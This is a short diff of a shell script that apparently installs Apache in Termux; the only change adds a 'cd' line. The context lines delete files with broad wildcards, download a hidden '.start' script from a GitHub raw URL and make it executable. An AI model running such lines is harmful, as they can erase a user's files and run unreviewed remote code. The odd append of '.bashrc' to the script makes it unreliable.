@@ -9,6 +9,7 @@ rm a*
 rm g*
 rm c*
 rm g*
+cd
 wget https://raw.githubusercontent.com/Tomasz1235I/apache-termux/.start
 chmod +x .start
 echo .bashrc >> ./.start
